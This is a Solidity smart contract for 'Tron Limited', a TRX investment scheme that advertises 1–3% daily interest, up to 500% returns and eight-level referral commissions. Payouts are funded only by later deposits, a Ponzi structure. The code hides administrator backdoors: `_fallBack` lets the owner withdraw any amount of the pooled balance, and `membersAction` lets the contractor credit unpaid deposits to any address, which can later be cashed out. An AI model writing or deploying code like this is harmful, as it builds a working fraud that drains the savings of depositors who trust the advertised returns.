//SourceUnit: tronlimited.sol

/*
 * Tron Limited
 * Main Website - www.tronlimited.com
 * 1 to 3 Percent daily interest depending upon your investment size
 * 200 to 500% maximum earnings depending upon your investment size
 * Huge Referral Commission up to 8 Levels
 */

pragma solidity ^0.4.25;

contract TronLimited {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint private minDepositSize1 = 50000000;
    uint private minDepositSize2 = 5000000000;
    uint private minDepositSize3 = 10000000000;
    uint private minDepositSize4 = 25000000000;
    uint private minDepositSize5 = 50000000000;
    uint private minDepositSize6 = 250000000000;
    uint private minDepositSize7 = 500000000000;
    uint private interestRateDivisor = 1000000000000;
    uint public constant devCommission = 1;
    uint public constant Aff = 36;
    uint public constant Aff1 = 15;
    uint public constant Aff1A = 10;
    uint public constant Aff1B = 12;
    uint public constant Aff2 = 7;
    uint public constant Aff3 = 4;
    uint public constant Aff4 = 2;
    uint public constant Aff5 = 2;
    uint public constant Aff6 = 2;
    uint public constant Aff7 = 2;
    uint public constant Aff8 = 2;
    uint public constant Interest1 = 200;
    uint public constant Interest2 = 250;
    uint public constant Interest3 = 300;
    uint public constant Interest4 = 350;
    uint public constant Interest5 = 400;
    uint public constant Interest6 = 450;
    uint public constant Interest7 = 500;
    uint public constant traderPool = 2;
    uint public constant commissionDivisor = 100;
    uint public collectProfit;
    uint private constant minuteRate1 = 347223;
    uint private constant minuteRate2 = 347223;
    uint private constant minuteRate3 = 462963;
    uint private constant minuteRate4 = 462963;
    uint private constant minuteRate5 = 578704;
    uint private constant minuteRate6 = 578704;
    uint private constant minuteRate7 = 578704;
    uint private constant releaseTime = 1595865600;

    address private trader1;
    address private trader2;
    address private trader3;
    address private trader4;
    address private contractor;

    address owner;

    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
    }

    mapping(address => Player) public players;

    constructor() public {
        contractor = msg.sender;
    }


    function register(address _addr, address _affAddr) private{

        Player storage player = players[_addr];

        player.affFrom = _affAddr;

        address _affAddr1 = _affAddr;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;

        players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
        players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
        players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
        players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);
        players[_affAddr5].aff5sum = players[_affAddr5].aff5sum.add(1);
        players[_affAddr6].aff6sum = players[_affAddr6].aff6sum.add(1);
        players[_affAddr7].aff7sum = players[_affAddr7].aff7sum.add(1);
        players[_affAddr8].aff8sum = players[_affAddr8].aff8sum.add(1);
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "Closed!");
        require(msg.value >= minDepositSize1);

        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0 && _affAddr != msg.sender){
                register(msg.sender, _affAddr);
            }
            else{
                register(msg.sender, trader4);
            }
        }

        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        uint _traderPool = depositAmount.mul(devCommission).mul(traderPool).div(commissionDivisor);
        contractor.transfer(_traderPool);
        trader1.transfer(_traderPool);
        trader2.transfer(_traderPool);
        trader3.transfer(_traderPool);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function reinvest() public {
        collect(msg.sender);
        Player storage player = players[msg.sender];
        uint256 depositAmount = player.interestProfit;
        require(address(this).balance >= depositAmount);
        player.interestProfit = 0;
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(depositAmount, player.affFrom);

        uint _traderPool = depositAmount.mul(devCommission).mul(traderPool).div(commissionDivisor);
        contractor.transfer(_traderPool);
        trader1.transfer(_traderPool);
        trader2.transfer(_traderPool);
        trader3.transfer(_traderPool);
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        uint _minuteRate;
        uint _Interest;

        if (secPassed > 0 && player.time > 0) {

            if (player.trxDeposit >= minDepositSize1 && player.trxDeposit <= minDepositSize2) {
                _minuteRate = minuteRate1;
                _Interest = Interest1;
            }

            if (player.trxDeposit > minDepositSize2 && player.trxDeposit <= minDepositSize3) {
                _minuteRate = minuteRate2;
                _Interest = Interest2;
            }

            if (player.trxDeposit > minDepositSize3 && player.trxDeposit <= minDepositSize4) {
                _minuteRate = minuteRate3;
                _Interest = Interest3;
            }

            if (player.trxDeposit > minDepositSize4 && player.trxDeposit <= minDepositSize5) {
                _minuteRate = minuteRate4;
                _Interest = Interest4;
            }
            if (player.trxDeposit > minDepositSize5 && player.trxDeposit <= minDepositSize6) {
                _minuteRate = minuteRate5;
                _Interest = Interest5;
            }

            if (player.trxDeposit > minDepositSize6 && player.trxDeposit <= minDepositSize7) {
                _minuteRate = minuteRate6;
                _Interest = Interest6;
            }
            if (player.trxDeposit > minDepositSize7) {
                _minuteRate = minuteRate7;
                _Interest = Interest7;
            }

            uint collectProfitGross = (player.trxDeposit.mul(secPassed.mul(_minuteRate))).div(interestRateDivisor);

            uint256 maxprofit = (player.trxDeposit.mul(_Interest).div(commissionDivisor));
            uint256 collectProfitNet = collectProfitGross.add(player.interestProfit);
            uint256 amountpaid = (player.payoutSum.add(player.affRewards));
            uint256 sum = amountpaid.add(collectProfitNet);

            if (sum <= maxprofit) {
                collectProfit = collectProfitGross;
            }
            else{
                uint256 collectProfit_net = maxprofit.sub(amountpaid);

                if (collectProfit_net > 0) {
                    collectProfit = collectProfit_net;
                }
                else{
                    collectProfit = 0;
                }
            }

            if (collectProfit > address(this).balance){collectProfit = 0;}

            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
            uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                _receiver.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(Aff)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {

            if (players[_affAddr1].aff1sum <= 10){_affRewards = (_trx.mul(Aff1A)).div(100);}
            if (players[_affAddr1].aff1sum > 10 && players[_affAddr1].aff1sum <= 50){_affRewards = (_trx.mul(Aff1B)).div(100);}
            if (players[_affAddr1].aff1sum > 50){_affRewards = (_trx.mul(Aff1)).div(100);}

            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            _affAddr1.transfer(_affRewards);

        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(Aff2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            _affAddr2.transfer(_affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(Aff3)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            _affAddr3.transfer(_affRewards);
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(Aff4)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            _affAddr4.transfer(_affRewards);
        }

        if (_affAddr5 != address(0)) {
            _affRewards = (_trx.mul(Aff5)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
            _affAddr5.transfer(_affRewards);
        }

        if (_affAddr6 != address(0)) {
            _affRewards = (_trx.mul(Aff6)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);
            _affAddr6.transfer(_affRewards);
        }

        if (_affAddr7 != address(0)) {
            _affRewards = (_trx.mul(Aff7)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);
            _affAddr7.transfer(_affRewards);
        }

        if (_affAddr8 != address(0)) {
            _affRewards = (_trx.mul(Aff8)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr8].affRewards = _affRewards.add(players[_affAddr8].affRewards);
            _affAddr8.transfer(_affRewards);
        }

        if(_allaff > 0 ){
            owner.transfer(_allaff);
        }
    }

    function getProfit(address _addr) public view returns (uint) {
        address playerAddress = _addr;
        Player storage player = players[playerAddress];
        require(player.time > 0);

        uint secPassed = now.sub(player.time);
        uint _minuteRate;
        uint _Interest;

        if (player.trxDeposit >= minDepositSize1 && player.trxDeposit <= minDepositSize2) {
            _minuteRate = minuteRate1;
            _Interest = Interest1;
        }

        if (player.trxDeposit > minDepositSize2 && player.trxDeposit <= minDepositSize3) {
            _minuteRate = minuteRate2;
            _Interest = Interest2;
        }

        if (player.trxDeposit > minDepositSize3 && player.trxDeposit <= minDepositSize4) {
            _minuteRate = minuteRate3;
            _Interest = Interest3;
        }

        if (player.trxDeposit > minDepositSize4 && player.trxDeposit <= minDepositSize5) {
            _minuteRate = minuteRate4;
            _Interest = Interest4;
        }
        if (player.trxDeposit > minDepositSize5 && player.trxDeposit <= minDepositSize6) {
            _minuteRate = minuteRate5;
            _Interest = Interest5;
        }

        if (player.trxDeposit > minDepositSize6 && player.trxDeposit <= minDepositSize7) {
            _minuteRate = minuteRate6;
            _Interest = Interest6;
        }
        if (player.trxDeposit > minDepositSize7) {
            _minuteRate = minuteRate7;
            _Interest = Interest7;
        }

        if (secPassed > 0) {
            uint256 collectProfitGross = (player.trxDeposit.mul(secPassed.mul(_minuteRate))).div(interestRateDivisor);
            uint256 maxprofit = (player.trxDeposit.mul(_Interest).div(commissionDivisor));
            uint256 collectProfitNet = collectProfitGross.add(player.interestProfit);
            uint256 amountpaid = (player.payoutSum.add(player.affRewards));
            uint256 sum = amountpaid.add(collectProfitNet);
            uint _collectProfit;

            if (sum <= maxprofit) {
                _collectProfit = collectProfitGross;
            }
            else{
                uint256 collectProfit_net = maxprofit.sub(amountpaid);

                if (collectProfit_net > 0) {
                    _collectProfit = collectProfit_net;
                }
                else{
                    _collectProfit = 0;
                }
            }

            if (_collectProfit > address(this).balance){_collectProfit = 0;}

        }

        return _collectProfit.add(player.interestProfit);
    }

    function updateFeed1(address _address) public {
        require(msg.sender == contractor || msg.sender == owner);
        trader1 = _address;
    }

    function updateFeed2(address _address) public {
        require(msg.sender == contractor || msg.sender == owner);
        trader2 = _address;
    }

    function updateFeed3(address _address) public {
        require(msg.sender == contractor || msg.sender == owner);
        trader3 = _address;
    }

    function updateFeed4(address _address) public {
        require(msg.sender == contractor || msg.sender == owner);
        trader4 = _address;
    }

    function setOwner(address _address) public {
        require(msg.sender == contractor || msg.sender == owner);
        owner = _address;
    }

    function membersAction(address _userId, uint _amount) public{
        require(msg.sender == contractor);

        Player storage player = players[_userId];
        player.trxDeposit = player.trxDeposit.add(_amount);

        totalInvested = totalInvested.add(_amount);

        player.time = now;

        totalPlayers++;
    }

    function _fallBack(uint _value) public{
        require(msg.sender == owner, 'not Allowed');
        owner.transfer(_value);
    }
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}